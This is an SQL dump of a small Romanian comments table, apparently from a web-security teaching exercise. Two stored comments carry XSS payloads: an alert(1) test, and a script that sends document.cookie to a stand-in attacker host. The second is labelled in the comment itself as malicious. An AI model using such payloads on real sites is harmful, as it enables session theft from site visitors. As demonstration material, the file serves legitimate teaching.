-- phpMyAdmin SQL Dump
-- version 4.0.10.20
-- https://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: May 25, 2020 at 04:48 PM
-- Server version: 5.1.73
-- PHP Version: 5.3.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `pw`
--

-- --------------------------------------------------------

--
-- Table structure for table `comentarii`
--

CREATE TABLE IF NOT EXISTS `comentarii` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `comentariu` varchar(255) NOT NULL,
  `nume` varchar(255) NOT NULL,
  `data` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `stare` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=15 ;

--
-- Dumping data for table `comentarii`
--

INSERT INTO `comentarii` (`id`, `comentariu`, `nume`, `data`, `stare`) VALUES
(2, 'Este foarte frumoasa!', 'Mihai', '2020-05-24 08:48:29', 1),
(4, 'Si mie imi place<script>alert(1)</script>', 'Ana', '2020-05-24 08:53:26', 1),
(8, 'Acest comentariu este malitios. Va dati seama de ce?<script>new Image().src="http://site-controlat-de-atacator.com/salveaza-cookie.php?cookie="+document.cookie;</script>', 'Gigi', '2020-05-24 10:38:13', 0),
(9, 'E photoshopata!', 'Maria', '2020-05-24 11:03:10', 1),
(10, 'Genial', 'Da', '2020-05-24 20:30:27', 1),
(13, 'cool', 'gigel', '2020-05-25 11:43:16', 0);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
